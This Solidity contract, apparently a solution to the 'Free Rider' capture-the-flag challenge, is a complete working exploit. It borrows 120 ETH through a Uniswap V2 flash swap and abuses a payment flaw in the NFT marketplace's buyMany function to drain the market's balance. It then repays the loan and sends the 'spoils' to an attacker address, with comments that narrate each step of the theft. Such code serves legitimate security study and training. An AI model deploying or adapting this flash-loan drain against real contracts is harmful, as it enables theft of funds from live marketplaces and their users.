// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IUniswapV2Pair {
    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;
}

interface IUniswapV2Callee {
    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external;
}

interface IFreeRiderNFTMarketplace {
    function offerMany(uint256[] calldata tokenIds, uint256[] calldata prices)
        external;

    function buyMany(uint256[] calldata tokenIds) external payable;

    function token() external returns (IERC721);
}

interface IWETH {
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function deposit() external payable;

    function withdraw(uint256 amount) external;
}

interface IERC721 {
    function setApprovalForAll(address operator, bool approved) external;

    function safeTransferFrom(
        address from,
        address to,
        uint256 tokenId
    ) external;
}

interface IERC721TokenReceiver {
    function onERC721Received(
        address _operator,
        address _from,
        uint256 _tokenId,
        bytes calldata _data
    ) external returns (bytes4);
}

contract FreeRiderExploit is IUniswapV2Callee, IERC721TokenReceiver {
    IUniswapV2Pair immutable uniswapPair;
    IWETH immutable weth;
    IFreeRiderNFTMarketplace immutable nftMarketplace;
    IERC721 immutable nft;
    address immutable attacker;
    address immutable buyer;

    constructor(
        address _uniswapPair,
        address _weth,
        address _nftMarketplace,
        address _nft,
        address _attacker,
        address _buyer
    ) {
        uniswapPair = IUniswapV2Pair(_uniswapPair);
        weth = IWETH(_weth);
        nftMarketplace = IFreeRiderNFTMarketplace(_nftMarketplace);
        nft = IERC721(_nft);
        attacker = _attacker;
        buyer = _buyer;
    }

    // 1 - trigger flash swap from Uniswap V2
    function attack() external {
        uniswapPair.swap(120 ether, 0, address(this), hex"00");
    }

    // 2 - Uniswap V2 callback after receiving flash swap
    function uniswapV2Call(
        address,
        uint256,
        uint256,
        bytes calldata
    ) external override {
        weth.withdraw(120 ether);

        // 3 - Buy 2 NFTs for 15 ETH each
        uint256[] memory tokenIds = new uint256[](2);
        tokenIds[0] = 0;
        tokenIds[1] = 1;
        nftMarketplace.buyMany{value: 30 ether}(tokenIds);

        // 4 - Put them back on sale for 90 ETH each
        nft.setApprovalForAll(address(nftMarketplace), true);
        uint256[] memory prices = new uint256[](2);
        prices[0] = 90 ether;
        prices[1] = 90 ether;
        nftMarketplace.offerMany(tokenIds, prices);

        // 5 - Buy them both but only send 90 ETH, the other 90 will be drained
        // from the market's own balance
        nftMarketplace.buyMany{value: 90 ether}(tokenIds);

        // 7 - Buy remaining 4 NFTs with 60 ETH gained
        tokenIds = new uint256[](4);
        tokenIds[0] = 2;
        tokenIds[1] = 3;
        tokenIds[2] = 4;
        tokenIds[3] = 5;
        nftMarketplace.buyMany{value: 60 ether}(tokenIds);

        // 8 - Send all 6 NFTs to buyer's contract
        for (uint256 tokenId = 0; tokenId < 6; tokenId++) {
            nft.safeTransferFrom(address(this), buyer, tokenId);
        }

        // 10 - Calculate fee and pay back loan
        uint256 fee = ((120 ether * 3) / uint256(997)) + 1;
        weth.deposit{value: 120 ether + fee}();
        weth.transfer(address(uniswapPair), 120 ether + fee);

        // 11 - Transfer spoils to attacker's EOA
        payable(attacker).transfer(address(this).balance);
    }

    // 6 - The contract will receive 180 ETH as the seller of NFTs, half from itself, other half stolen
    // 9 - The contract receives the 45 ETH reward afte the last NFT is sent to the buyer's contract
    receive() external payable {}

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external pure override returns (bytes4) {
        return IERC721TokenReceiver.onERC721Received.selector;
    }
}
